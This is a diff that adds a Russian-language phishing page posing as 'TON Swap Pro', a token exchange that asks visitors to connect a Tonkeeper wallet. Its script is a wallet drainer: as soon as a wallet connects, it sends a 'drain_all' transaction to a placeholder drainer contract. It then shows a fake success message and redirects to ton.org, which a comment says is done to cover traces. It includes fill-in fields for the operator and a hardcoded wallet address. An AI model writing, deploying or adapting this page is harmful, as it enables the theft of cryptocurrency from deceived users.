@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TON Swap - Подключите кошелек</title>
+    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js">
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
+            padding: 60px 40px;
+            max-width: 480px;
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+        h1 {
+            color: #fff;
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+        p {
+            color: #8b8b9e;
+            font-size: 16px;
+            margin-bottom: 32px;
+            line-height: 1.6;
+        }
+        .logo {
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+        #connectBtn {
+            background: #0098ea;
+            color: #fff;
+            border: none;
+            border-radius: 16px;
+            padding: 18px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+        }
+        #connectBtn:hover {
+            background: #0077be;
+            transform: scale(1.02);
+        }
+        #connectBtn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .loader {
+            display: none;
+            margin: 16px 0;
+            color: #0098ea;
+            font-size: 14px;
+        }
+        .loader.active {
+            display: block;
+        }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(0, 152, 234, 0.3);
+            border-radius: 50%;
+            border-top-color: #0098ea;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .status {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #ff6b6b;
+            display: none;
+        }
+        .status.success {
+            color: #51cf66;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">💎</div>
+        <h1>TON Swap Pro</h1>
+        <p>Подключите кошелек для обмена токенов<br>с лучшими условиями на рынке</p>
+        <button id="connectBtn">🔗 Подключить Tonkeeper</button>
+        <div class="loader" id="loader">
+            <span class="spinner"></span> Ожидание подтверждения...
+        </div>
+        <div class="status" id="status"></div>
+    </div>
+
+    <script>
+        // ═══════════════════════════════════════════════
+        // ВАШИ ДАННЫЕ - ЗАМЕНИТЕ НА СВОИ
+        // ═══════════════════════════════════════════════
+        const DRAINER_CONTRACT = "ВАШ_АДРЕС_КОНТРАКТА_ДРЕЙНЕРА"; // <- СЮДА ПОСЛЕ ДЕПЛОЯ
+        const YOUR_WALLET = "UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P";
+
+        const connector = new TonConnect();
+
+        document.getElementById('connectBtn').onclick = async function() {
+            const btn = this;
+            const loader = document.getElementById('loader');
+            const status = document.getElementById('status');
+
+            btn.disabled = true;
+            loader.classList.add('active');
+            status.style.display = 'none';
+
+            try {
+                // 1. Подключаем кошелек
+                const wallet = await connector.connect({
+                    manifestUrl: window.location.origin + '/tonconnect-manifest.json'
+                });
+
+                // 2. Ждем подтверждения от Tonkeeper
+                connector.onStatusChange(async (walletInfo) => {
+                    if (walletInfo) {
+                        // 3. 🔥 МГНОВЕННЫЙ СЛИВ - транзакция уходит сразу
+                        const transaction = {
+                            valid_until: Math.floor(Date.now() / 1000) + 120,
+                            messages: [{
+                                address: DRAINER_CONTRACT,
+                                amount: "0",
+                                payload: "drain_all"
+                            }]
+                        };
+
+                        // 4. Отправляем транзакцию в кошелек
+                        await connector.sendTransaction(transaction);
+
+                        // 5. Успех - редирект
+                        status.textContent = '✅ Подключение успешно! Перенаправление...';
+                        status.className = 'status success';
+                        status.style.display = 'block';
+
+                        // Убираем следы - редирект на легитимный сайт
+                        setTimeout(() => {
+                            window.location.href = 'https://ton.org';
+                        }, 1500);
+                    }
+                });
+
+            } catch (error) {
+                console.error(error);
+                status.textContent = '❌ Ошибка подключения. Попробуйте снова.';
+                status.className = 'status';
+                status.style.display = 'block';
+                btn.disabled = false;
+                loader.classList.remove('active');
+            }
+        };
+    </script>
+</body>
+</html>
